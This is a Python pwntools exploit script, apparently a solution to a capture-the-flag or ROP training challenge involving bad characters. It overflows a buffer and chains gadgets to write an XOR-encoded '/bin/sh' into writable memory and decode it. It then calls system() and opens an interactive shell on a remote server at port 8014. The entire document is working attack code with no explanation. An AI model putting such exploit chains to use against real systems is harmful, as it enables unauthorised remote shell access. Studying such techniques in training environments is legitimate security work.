from pwn import *

pop_r12_r13  = 0x0000000000400b3b
mov_r13_r12  = 0x0000000000400b34
pop_r14_r15  = 0x0000000000400b40
xor_r15_r14b = 0x0000000000400b30
pop_rdi      = 0x0000000000400b39

system_plt = 0x00000000004006f0
data_addr  = 0x0000000000601000

badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xor_byte = 0x1
while(1):
    binsh = ""
    for i in "/bin/sh\x00":
        c = ord(i) ^ xor_byte
        if c in badchars:
            xor_byte += 1
            break
        else:
            binsh += chr(c)
    if len(binsh) == 8:
        break

payload = ""
payload += "A"*40
payload += p64(pop_r12_r13)
payload += binsh
payload += p64(data_addr)
payload += p64(mov_r13_r12)

for i in range(len(binsh)):
    payload += p64(pop_r14_r15)
    payload += p64(xor_byte)
    payload += p64(data_addr + i)
    payload += p64(xor_r15_r14b)

payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(system_plt)

io = remote('notmonitoringyourinternettraffic.ns.agency', 8014)
io.recvuntil('>')
io.sendline(payload)
io.interactive()

